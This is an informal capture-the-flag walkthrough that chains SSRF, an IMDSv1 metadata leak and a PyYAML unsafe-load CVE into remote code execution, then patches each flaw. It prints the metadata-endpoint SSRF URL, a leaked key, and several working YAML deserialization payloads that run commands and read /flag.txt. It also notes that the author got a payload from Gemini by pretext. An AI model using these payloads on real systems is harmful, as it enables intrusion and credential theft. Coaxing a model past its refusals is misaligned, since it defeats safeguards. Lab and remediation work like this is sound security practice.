first we run pip-audit to scan the vulnrable dependencies
Command : docker run --rm -v "${PWD}:/src" -w /src python:3.11-slim sh -c "pip install -q pip-audit && pip-audit -r requirements.txt -o pip_scan.txt"
pip-audit didnt return to much informations so we test via trivy even if it will take more time
Command : docker run --rm -v "${PWD}:/src" aquasec/trivy:latest fs --scanners vuln --output /src/trivy-scan.txt /src/requirements.txt
trivy gave better results searching for each
found it :
https://avd.aquasec.com/nvd/2019/cve-2019-20477/
PyYAML 5.1 through 5.1.2 has insufficient restrictions on the load and load_all functions because of a class deserialization issue, e.g., Popen is a class in the subprocess module. NOTE: this issue exists because of an incomplete fix for CVE-2017-18342.
load function is used in the code




then we preform secure code review to locate any bug
//No safe loader but because they can load only their templates set as Low
return yaml.load(data)

//No URL Check SSRF
@app.route("/import")
def import_template():
    url = request.args.get("url", "")
    if not url:
        return "provide ?url=", 400
    r = requests.get(url, timeout=5)
    return r.text[:5000]


//Debug is set to TRUE also set as LOW 
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)



//IMDSv1 is accepted 
resource "aws_instance" "reportforge" {
  ami           = "ami-0abc123"
  instance_type = "t3.small"
  iam_instance_profile = aws_iam_instance_profile.reportforge.name

  metadata_options {
    # [AppSec: http_tokens = "optional" means IMDSv1 is still accepted.
    #  Noted, but the instance isn't directly internet-facing. Rated LOW.]
    http_tokens                 = "optional"
    http_put_response_hop_limit = 2
  }
}

what to do :
IMDSv1 is enabled + SSRF = Full MetaData leak
Full MetaData Leak = Uploading yml file via the leaked X-AMZ-Secret secret
PyYAML 5.1 CVE + Uploading yml file via the leaked X-AMZ-Secret secret = RCE 
i dont know if its RCE or will work OOB using the Reload Templates function
we will test anyway
starting ....

SSRF applied : http://169.254.169.254/latest/meta-data/iam/security-credentials/reportforge-role
got the secret AWS key : rfS3cr3t-Acc3ss-K3y-9x7
found a payload on github
!!python/object/new:os.system [echo EXPLOIT!]
testing it
got error in reloding 
restarting the server
docker compose restart configstore
retesting as a string : 
'!!python/object/apply/system ["echo rce_success > rce_demo.txt"]'
it took as a string what would u expect ? lmfao
testing this : !!python/object/new:os.system [echo EXPLOIT!]
it returned 0 but we knew something just happend
trying this :
!!python/object/apply:subprocess.Popen
- ls
RCE confirmed but syntax error returned : <h1><Popen: returncode: None args: 'ls'></h1><ul></ul>
Searching on web ... 
asked gemini and convinced him its for the code 
got this 
ls_process: !!python/object/apply:subprocess.Popen
  - - ls
    - -l
testing ...
worked !! there is report file in the directory
cat it 
cat_process: !!python/object/apply:subprocess.Popen
  - - cat
    - file.txt
  - stdout: -1
got error
restarting ...

got it
title: !!python/object/apply:subprocess.check_output [["ls", "/"]]
title: !!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
thanks master <3
flag : 
FLAG{l0w_vulns_ch41n3d_1nt0_full_rc3}

the attacking PART IS DONE !!!
now securing part
1.we change the cloud settings to enforce IMDSv2 :
    #Changing the "Optional" to "Required"
    http_tokens                 = "required"
    #Changing limit from 2 to 1
    http_put_response_hop_limit = 1
2.we patch the SSRF vulnruble code by 
  2_1 creating a is_safe function to check the URL safety :
    def is_safe(url):
      p = urlsplit(url)
      if p.scheme not in ("http", "https") or not p.hostname:
        return False
      try:
        ips = {i[4][0] for i in socket.getaddrinfo(p.hostname, None)}
      except socket.gaierror:
        return False
    return all(ipaddress.ip_address(ip).is_global for ip in ips)
  2_2 using the check function in the main function :
     @app.route("/import")
    def import_template():
      url = request.args.get("url", "")
      if not is_safe(url):
        return "URL not allowed", 400
      r = requests.get(url, timeout=5, allow_redirects=False)
      return r.text[:5000], 200, {"Content-Type": "text/plain"}

3  Changing Debug mode to False for production deployment   
if __name__ == "__main__":
    # [AppSec: debug=True in prod was noted. Low — convenient for the team.]
    app.run(host="0.0.0.0", port=8080, debug=False)



4 the user must see only generic error messages, not the full traceback or internal details, to avoid information leakage.
@app.errorhandler(Exception)
def handle_error(e):
    if isinstance(e, HTTPException):
        return e
    error_id = uuid.uuid4().hex[:8]
    logging.exception("Unhandled error %s", error_id)
    return jsonify({"error": "Internal server error", "id": error_id}), 500

5 The last part SCA 
3 libs are vulnrable 
requests , PyYAML , Flask all used 
but only PyYAML is exploitable
fixing it to :
PyYAML>=6.0.2

restarting and testing
